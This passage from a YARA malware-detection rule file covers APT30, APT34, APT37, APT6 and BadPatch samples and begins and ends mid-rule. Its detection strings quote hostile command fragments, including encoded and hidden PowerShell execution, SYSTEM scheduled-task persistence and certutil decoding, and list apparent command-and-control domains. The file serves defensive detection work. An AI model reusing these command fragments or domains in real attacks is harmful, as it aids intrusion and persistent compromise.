\"dizhi.gif\" fullword ascii\n        $s5 = \"oftHaveAck+\" ascii\n        $s10 = \"HlobalAl\" fullword ascii\n        $s13 = \"$NtRND1$\" fullword ascii\n        $s14 = \"_NStartup\" fullword ascii\n        $s16 = \"GXSYSTEM\" fullword ascii\n\n    condition:\n        filesize < 100KB and uint16(0) == 0x5A4D and all of them\n}\n\nrule APT30_Sample_28\n{\n    meta:\n        description = \"FireEye APT30 Report Sample (file: e62a63307deead5c9fcca6b9a2d51fb0)\"\n        threat_names = \"APT30\"\n        ref = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT30_Sample_28\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"www.flyeagles.com\" fullword ascii\n        $s1 = \"iexplore.exe\" fullword ascii\n        $s2 = \"www.km-nyc.com\" fullword ascii\n        $s3 = \"cmdLine.exe\" fullword ascii\n        $s4 = \"Software\\\\Microsoft\\\\CurrentNetInf\" fullword ascii\n        $s5 = \"/dizhi.gif\" ascii\n        $s6 = \"/connect.gif\" ascii\n        $s7 = \"USBTest.sys\" fullword ascii\n        $s8 = \"/ver.htm\" fullword ascii\n        $s11 = \"\\\\netscv.exe\" fullword ascii\n        $s12 = \"/app.htm\" fullword ascii\n        $s13 = \"\\\\netsvc.exe\" fullword ascii\n        $s14 = \"/exe.htm\" fullword ascii\n        $s18 = \"MicrosoftHaveAck\" fullword ascii\n        $s19 = \"MicrosoftHaveExit\" fullword ascii\n\n    condition:\n        filesize < 100KB and uint16(0) == 0x5A4D and 7 of them\n}\n\nrule APT30_Sample_29\n{\n    meta:\n        description = \"FireEye APT30 Report Sample (file: 1b81b80ff0edf57da2440456d516cc90)\"\n        threat_names = \"APT30\"\n        ref = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT30_Sample_29\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"LSSAS.exe\" fullword ascii\n        $s1 = \"Software\\\\Microsoft\\\\FlashDiskInf\" fullword ascii\n        $s2 = \".petite\" fullword ascii\n        $s3 = \"MicrosoftFlashExit\" fullword ascii\n        $s4 = \"MicrosoftFlashHaveExit\" fullword ascii\n        $s5 = \"MicrosoftFlashHaveAck\" fullword ascii\n        $s6 = \"\\\\driver32\" fullword ascii\n        $s7 = \"MicrosoftFlashZJ\" fullword ascii\n\n    condition:\n        filesize < 100KB and uint16(0) == 0x5A4D and all of them\n}\n\nrule APT30_Sample_30\n{\n    meta:\n        description = \"FireEye APT30 Report Sample (file: bf8616bbed6d804a3dea09b230c2ab0c)\"\n        threat_names = \"APT30\"\n        ref = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT30_Sample_30\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"5.1.2600.2180 (xpsp_sp2_rtm.040803-2158)\" fullword wide\n        $s3 = \"RnhwtxtkyLRRMf{jJ}ny\" fullword ascii\n        $s4 = \"RnhwtxtkyLRRJ}ny\" fullword ascii\n        $s5 = \"ZRLDownloadToFileA\" fullword ascii\n        $s9 = \"5.1.2600.2180\" fullword wide\n\n    condition:\n        filesize < 100KB and uint16(0) == 0x5A4D and all of them\n}\n\nrule APT30_Sample_31\n{\n    meta:\n        description = \"FireEye APT30 Report Sample (file: d8e68db503f4155ed1aeba95d1f5e3e4)\"\n        threat_names = \"APT30\"\n        ref = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT30_Sample_31\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"\\\\ZJRsv.tem\" fullword ascii\n        $s1 = \"forceguest\" fullword ascii\n        $s4 = \"\\\\$NtUninstallKB570317$\" fullword ascii\n        $s8 = \"[Can'tGetIP]\" fullword ascii\n        $s14 = \"QWERTY:,`/\" fullword ascii\n\n    condition:\n        filesize < 100KB and uint16(0) == 0x5A4D and all of them\n}\n\nrule APT30_Generic_J\n{\n    meta:\n        description = \"FireEye APT30 Report Sample (file: baff5262ae01a9217b10fcd5dad9d1d5)\"\n        threat_names = \"APT30\"\n        ref = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT30_Generic_J\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"Launcher.EXE\" fullword wide\n        $s1 = \"Symantec Security Technologies\" fullword wide\n        $s2 = \"\\\\Symantec LiveUpdate.lnk\" fullword ascii\n        $s3 = \"Symantec Service Framework\" fullword wide\n        $s4 = \"\\\\ccSvcHst.exe\" fullword ascii\n        $s5 = \"\\\\wssfmgr.exe\" fullword ascii\n        $s6 = \"Symantec Corporation\" fullword wide\n        $s7 = \"\\\\5.1.0.29\" fullword ascii\n        $s8 = \"\\\\Engine\" fullword ascii\n        $s9 = \"Copyright (C) 2000-2010 Symantec Corporation. All rights reserved.\" fullword wide\n        $s10 = \"Symantec LiveUpdate\" fullword ascii\n        $s11 = \"\\\\Norton360\" fullword ascii\n        $s15 = \"BinRes\" fullword ascii\n        $s16 = \"\\\\readme.lz\" fullword ascii\n\n    condition:\n        filesize < 100KB and uint16(0) == 0x5A4D and all of them\n}\n\nrule APT30_Microfost\n{\n    meta:\n        description = \"FireEye APT30 Report Sample (file: 310a4a62ba3765cbf8e8bbb9f324c503)\"\n        threat_names = \"APT30\"\n        ref = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT30_Microfost\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Copyright (c) 2007 Microfost All Rights Reserved\" fullword wide\n        $s2 = \"Microfost\" fullword wide\n\n    condition:\n        filesize < 100KB and uint16(0) == 0x5A4D and all of them\n}\n\nrule APT30_Generic_K\n{\n    meta:\n        description = \"FireEye APT30 Report Sample (file: b5a343d11e1f7340de99118ce9fc1bbb)\"\n        threat_names = \"APT30\"\n        ref = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT30_Generic_K\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"Maybe a Encrypted Flash\" fullword ascii\n        $s0 = \"C:\\\\Program Files\\\\Common Files\\\\System\\\\wab32\" fullword ascii\n        $s1 = \"\\\\TEMP\\\\\" fullword ascii\n        $s2 = \"\\\\Temporary Internet Files\\\\\" fullword ascii\n        $s5 = \"%s Size:%u Bytes\" fullword ascii\n        $s7 = \"$.DATA$\" fullword ascii\n        $s10 = \"? Size:%u By s\" fullword ascii\n        $s12 = \"Maybe a Encrypted Flash\" fullword ascii\n        $s14 = \"Name:%-32s\" fullword ascii\n        $s15 = \"NickName:%-32s\" fullword ascii\n        $s19 = \"Email:%-32s\" fullword ascii\n        $s21 = \"C:\\\\Prog\" ascii\n        $s22 = \"$LDDATA$\" ascii\n        $s31 = \"Copy File %s OK!\" fullword ascii\n        $s32 = \"%s Space:%uM,FreeSpace:%uM\" fullword ascii\n        $s34 = \"open=%s\" fullword ascii\n\n    condition:\n        filesize < 100KB and uint16(0) == 0x5A4D and (all of ($x*) and 3 of ($s*))\n}\n\nrule APT30_Sample_33\n{\n    meta:\n        description = \"FireEye APT30 Report Sample (file: 5eaf3deaaf2efac92c73ada82a651afe)\"\n        threat_names = \"APT30\"\n        ref = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT30_Sample_33\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"Version 4.7.3001\" fullword wide\n        $s1 = \"msmsgr.exe\" fullword wide\n        $s2 = \"MYUSER32.dll\" fullword ascii\n        $s3 = \"MYADVAPI32.dll\" fullword ascii\n        $s4 = \"CeleWare.NET1\" fullword ascii\n        $s6 = \"MYMSVCRT.dll\" fullword ascii\n        $s7 = \"Microsoft(R) is a registered trademark of Microsoft Corporation in the\" wide\n        $s8 = \"WWW.CeleWare.NET1\" ascii\n\n    condition:\n        filesize < 100KB and uint16(0) == 0x5A4D and 6 of them\n}\n\nrule APT30_Sample_34\n{\n    meta:\n        description = \"FireEye APT30 Report Sample (file: a9e8e402a7ee459e4896d0ba83543684)\"\n        threat_names = \"APT30\"\n        ref = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT30_Sample_34\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"dizhi.gif\" ascii\n        $s1 = \"eagles.vip.nse\" ascii\n        $s4 = \"o%S:S0\" ascii\n        $s5 = \"la/4.0\" ascii\n        $s6 = \"s#!<4!2>s02==<'s1\" ascii\n        $s7 = \"HlobalAl\" ascii\n        $s9 = \"vcMicrosoftHaveAck7\" ascii\n\n    condition:\n        filesize < 100KB and uint16(0) == 0x5A4D and all of them\n}\n\nrule APT30_Sample_35\n{\n    meta:\n        description = \"FireEye APT30 Report Sample (file: 414854a9b40f7757ed7bfc6a1b01250f)\"\n        threat_names = \"APT30\"\n        ref = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT30_Sample_35\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"WhBoyIEXPLORE.EXE.exe\" fullword ascii\n        $s5 = \"Startup>A\" fullword ascii\n        $s18 = \"olhelp32Snapshot\" fullword ascii\n\n    condition:\n        filesize < 100KB and uint16(0) == 0x5A4D and all of them\n}\n\nrule APT30_Sample_1\n{\n    meta:\n        description = \"FireEye APT30 Report Sample (file: 4c6b21e98ca03e0ef0910e07cef45dac)\"\n        threat_names = \"APT30\"\n        ref = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT30_Sample_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"#hostid\" fullword ascii\n        $s1 = \"\\\\Windows\\\\C\" ascii\n        $s5 = \"TimUmove\" fullword ascii\n        $s6 = \"Moziea/4.0 (c\" fullword ascii\n        $s7 = \"StartupNA\" fullword ascii\n\n    condition:\n        filesize < 100KB and uint16(0) == 0x5A4D and all of them\n}\n\nrule APT30_Generic_1\n{\n    meta:\n        description = \"FireEye APT30 Report Sample\"\n        threat_names = \"APT30\"\n        ref = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT30_Generic_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"%s\\\\%s.txt\" fullword\n        $s1 = \"\\\\ldsysinfo.txt\" fullword\n        $s4 = \"(Extended Wansung)\" fullword\n        $s6 = \"Computer Name:\" fullword\n        $s7 = \"%s %uKB %04u-%02u-%02u %02u:%02u\" fullword\n        $s8 = \"ASSAMESE\" fullword\n        $s9 = \"BELARUSIAN\" fullword\n        $s10 = \"(PR China)\" fullword\n        $s14 = \"(French)\" fullword\n        $s15 = \"AdvancedServer\" fullword\n        $s16 = \"DataCenterServer\" fullword\n        $s18 = \"(Finland)\" fullword\n        $s19 = \"%s %04u-%02u-%02u %02u:%02u\" fullword\n        $s20 = \"(Chile)\" fullword\n\n    condition:\n        filesize < 250KB and uint16(0) == 0x5A4D and all of them\n}\n\nrule APT30_Generic_2\n{\n    meta:\n        description = \"FireEye APT30 Report Sample - from many files\"\n        threat_names = \"APT30\"\n        ref = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT30_Generic_2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"%s\\\\%s\\\\KB985109.log\" fullword\n        $s1 = \"%s\\\\%s\\\\KB989109.log\" fullword\n        $s2 = \"Opera.exe\" fullword wide\n        $s3 = \"%s:All online success on %u!\" fullword\n        $s4 = \"%s:list online success on %u!\" fullword\n        $s5 = \"%s:All online fail!\" fullword\n        $s6 = \"Copyright Opera Software 1995-\" fullword wide\n        $s7 = \"%s:list online fail!\" fullword\n        $s8 = \"OnlineTmp.txt\" fullword\n        $s9 = \"Opera Internet Browser\" fullword wide\n        $s12 = \"Opera Software\" fullword wide\n        $s15 = \"Check lan have done!!!\" fullword\n        $s16 = \"List End.\" fullword\n\n    condition:\n        filesize < 100KB and uint16(0) == 0x5A4D and all of them\n}\n\nrule APT30_Generic_4\n{\n    meta:\n        description = \"FireEye APT30 Report Sample\"\n        threat_names = \"APT30\"\n        ref = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT30_Generic_4\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"del NetEagle_Scout.bat\" fullword\n        $s1 = \"NetEagle_Scout.bat\" fullword\n        $s2 = \"\\\\visit.exe\" fullword\n        $s3 = \"\\\\System.exe\" fullword\n        $s4 = \"\\\\System.dat\" fullword\n        $s5 = \"\\\\ieupdate.exe\" fullword\n        $s6 = \"GOTO ERROR\" fullword\n        $s7 = \":ERROR\" fullword\n        $s9 = \"IF EXIST \" fullword\n        $s10 = \"ioiocn\" fullword\n        $s11 = \"SetFileAttribute\" fullword\n        $s12 = \"le_0*^il\" fullword\n        $s13 = \"le_.*^il\" fullword\n        $s14 = \"le_-*^il\" fullword\n\n    condition:\n        filesize < 250KB and uint16(0) == 0x5A4D and all of them\n}\n\nrule APT30_Generic_5\n{\n    meta:\n        description = \"FireEye APT30 Report Sample\"\n        threat_names = \"APT30\"\n        ref = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT30_Generic_5\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"regsvr32 /s \\\"%ProgramFiles%\\\\Norton360\\\\Engine\\\\5.1.0.29\\\\ashelper.dll\\\"\" fullword\n        $s1 = \"name=\\\"ftpserver.exe\\\"/>\" fullword\n        $s2 = \"LiveUpdate.EXE\" fullword wide\n        $s3 = \"<description>FTP Explorer</description>\" fullword\n        $s4 = \"\\\\ashelper.dll\" fullword\n        $s5 = \"LiveUpdate\" fullword wide\n\n    condition:\n        filesize < 100KB and uint16(0) == 0x5A4D and all of them\n}\n\nrule APT30_Generic_6\n{\n    meta:\n        description = \"FireEye APT30 Report Sample\"\n        threat_names = \"APT30\"\n        ref = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT30_Generic_6\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"GetStar\" fullword\n        $s1 = \".rdUaS\" fullword\n        $s2 = \"%sOTwp/&A\\\\L\" fullword\n        $s3 = \"a Encrt% Flash Disk\" fullword\n        $s4 = \"ypeAutoRuChec\" fullword\n        $s5 = \"NoDriveT\" fullword\n\n    condition:\n        filesize < 100KB and uint16(0) == 0x5A4D and all of them\n}\n\nrule APT30_Generic_7\n{\n    meta:\n        description = \"FireEye APT30 Report Sample\"\n        threat_names = \"APT30\"\n        ref = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT30_Generic_7\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Xjapor_*ata\" fullword\n        $s2 = \"Xjapor_o*ata\" fullword\n        $s4 = \"Ouopai\" fullword\n\n    condition:\n        filesize < 100KB and uint16(0) == 0x5A4D and all of them\n}\n\nrule APT30_Generic_8\n{\n    meta:\n        description = \"FireEye APT30 Report Sample\"\n        threat_names = \"APT30\"\n        ref = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT30_Generic_8\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"Windows NT4.0\" fullword\n        $s1 = \"Windows NT3.51\" fullword\n        $s2 = \"%d;%d;%d;%ld;%ld;%ld;\" fullword\n        $s3 = \"%s %d.%d Build%d %s\" fullword\n        $s4 = \"MSAFD Tcpip [TCP/IP]\" fullword\n        $s5 = \"SQSRSS\" fullword\n        $s8 = \"WM_COMP\" fullword\n        $s9 = \"WM_MBU\" fullword\n        $s11 = \"WM_GRID\" fullword\n        $s12 = \"WM_RBU\" fullword\n\n    condition:\n        filesize < 250KB and uint16(0) == 0x5A4D and all of them\n}\n\nrule APT30_Generic_9\n{\n    meta:\n        description = \"FireEye APT30 Report Sample\"\n        threat_names = \"APT30\"\n        ref = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT30_Generic_9\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"%s\\\\%s\\\\$NtRecDoc$\" fullword\n        $s1 = \"%s(%u)%s\" fullword\n        $s2 = \"http://%s%s%s\" fullword\n        $s3 = \"1.9.1.17\" fullword wide\n        $s4 = \"(C)Firefox and Mozilla Developers, according to the MPL 1.1/GPL 2.0/LGPL\" wide\n\n    condition:\n        filesize < 250KB and uint16(0) == 0x5A4D and all of them\n}\n\nrule APT30_apt_backspace\n{\n    meta:\n        description = \"APT backspace\"\n        threat_names = \"APT30\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Bit Byte Bitten\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"apt_backspace\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"!! Use Splice Socket !!\"\n        $s2 = \"User-Agent: SJZJ (compatible; MSIE 6.0; Win32)\"\n        $s3 = \"g_nAV=%d,hWnd:0x%X,className:%s,Title:%s,(%d,%d,%d,%d),BOOL=%d\"\n\n    condition:\n        uint16(0) == 0x5a4d and all of them\n}\n\nrule APT34_Malware_HTA\n{\n    meta:\n        description = \"APT34 malware\"\n        threat_names = \"APT34\"\n        ref = \"https://www.fireeye.com/blog/threat-research/2017/12/targeted-attack-in-middle-east-by-apt34.html\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT34_Malware_HTA\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"WshShell.run \\\"cmd.exe /C C:\\\\ProgramData\\\\\" ascii\n        $x2 = \".bat&ping 127.0.0.1 -n 6 > nul&wscript  /b\" ascii\n        $x3 = \"cmd.exe /C certutil -f  -decode C:\\\\ProgramData\\\\\" ascii\n        $x4 = \"a.WriteLine(\\\"set Shell0 = CreateObject(\" ascii\n        $x5 = \"& vbCrLf & \\\"Shell0.run\" ascii\n        $s1 = \"<title>Blog.tkacprow.pl: HTA Hello World!</title>\" fullword ascii\n        $s2 = \"<body onload=\\\"test()\\\">\" fullword ascii\n\n    condition:\n        filesize < 60KB and (1 of ($x*) or all of ($s*))\n}\n\nrule APT34_Malware_Exeruner\n{\n    meta:\n        description = \"APT34 malware\"\n        threat_names = \"APT34\"\n        ref = \"https://www.fireeye.com/blog/threat-research/2017/12/targeted-attack-in-middle-east-by-apt34.html\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT34_Malware_Exeruner\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"\\\\obj\\\\Debug\\\\exeruner.pdb\" ascii\n        $x2 = \"\\\"wscript.shell`\\\")`nShell0.run\" wide\n        $x3 = \"powershell.exe -exec bypass -enc \\\" + ${global:$http_ag} +\" wide\n        $x4 = \"/c powershell -exec bypass -window hidden -nologo -command \" fullword wide\n        $x5 = \"\\\\UpdateTasks\\\\JavaUpdatesTasksHosts\\\\\" wide\n        $x6 = \"schtasks /create /F /ru SYSTEM /sc minute /mo 1 /tn\" wide\n        $x7 = \"UpdateChecker.ps1 & ping 127.0.0.1\" wide\n        $s8 = \"exeruner.exe\" fullword wide\n        $s9 = \"${global:$address1} = $env:ProgramData + \\\"\\\\Windows\\\\Microsoft\\\\java\\\";\" fullword wide\n        $s10 = \"C:\\\\ProgramData\\\\Windows\\\\Microsoft\\\\java\" fullword wide\n        $s11 = \"function runByVBS\" fullword wide\n        $s12 = \"$84e31856-683b-41c0-81dd-a02d8b795026\" fullword ascii\n        $s13 = \"${global:$dns_ag} = \\\"aQBmACAAKAAoAEcAZQB0AC0AVwBtAGk\" wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 100KB and 1 of them\n}\n\nrule APT37_Scarcruft_malware_Feb18_1\n{\n    meta:\n        description = \"Scarcruft malware - February 2018\"\n        threat_names = \"APT37\"\n        ref = \"https://twitter.com/craiu/status/959477129795731458\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Scarcruft_malware_Feb18_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"d:\\\\HighSchool\\\\version 13\\\\2ndBD\\\\T+M\\\\\" ascii\n        $x2 = \"cmd.exe /C ping 0.1.1.2\" wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 2000KB and 1 of them\n}\n\nrule APT6_Malware_Sample_Gen\n{\n    meta:\n        description = \"Malware samples that communicated to APT6 C&C servers\"\n        threat_names = \"APT6\"\n        ref = \"https://otx.alienvault.com/pulse/56c4d1664637f26ad04e5b73/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT6_Malware_Sample_Gen\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x2 = \"SPCK!it is a [(?riddle?) wrapped in a {mystery}] inside an <enigma>!\" fullword ascii\n        $x3 = \"636C7369643A46334430443336462D323346382D343638322D413139352D373443393242303344344146\" fullword ascii\n        $s1 = \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)\" fullword ascii\n        $s2 = \"DUMPTHIN\" fullword ascii\n        $s3 = \"\\\"C:\\\\WINDOWS\\\\system32\\\\\" fullword ascii\n        $s4 = \"window.eval(f.decodeURIComponent(a));\" fullword ascii\n        $s5 = \"/tbedrs.dll\" fullword ascii\n        $s6 = \"NSISDL/1.2 (Mozilla)\" fullword ascii\n        $s7 = \"NSIS_Inetc (Mozilla)\" fullword ascii\n        $s8 = \"/logos.gif\" fullword ascii\n        $s9 = \"synflood\" fullword ascii\n        $s10 = \"IconFile=C:\\\\WINDOWS\\\\system32\\\\SHELL32.dll\" fullword ascii\n        $s11 = \"udpflood\" fullword ascii\n        $s12 = \"shellcode\" fullword ascii\n        $s13 = \"&PassWord=\" fullword ascii\n        $s14 = \"SystemPropertiesProtection.exe\" fullword ascii\n        $s15 = \"SystemPropertiesRemote.exe\" fullword ascii\n        $c1 = \"jobcall.org\" ascii\n        $c2 = \"sportsinfinite.com\" ascii\n        $c3 = \"milsatcom.us\" ascii\n        $c4 = \"geographicphotographer.com\" ascii\n        $c5 = \"snowsmooth.com\" ascii\n        $c6 = \"goodre.net\" ascii\n        $c7 = \"gloflabs.com\" ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 1000KB and ((1 of ($x*) and 3 of ($s*)) or 1 of ($c*))) or (6 of them)\n}\n\nrule BadPatch_WinAgent_BadPatch_1\n{\n    meta:\n        description = \"Samples mentioned in BadPatch report\"\n        threat_names = \"BadPatch\"\n        ref = \"https://goo.gl/RvDwwA\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"WinAgent_BadPatch_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"J:\\\\newPatch\\\\downloader\\\\\" wide\n        $x2 = \"L:\\\\rashed\\\\New code\\\\\" wide\n        $x3 = \":\\\\newPatch\\\\last version\\\\\" wide\n        $x4 = \"\\\\Microsoft\\\\Microsoft\\\\Microsoft1.log\" fullword wide\n        $x5 = 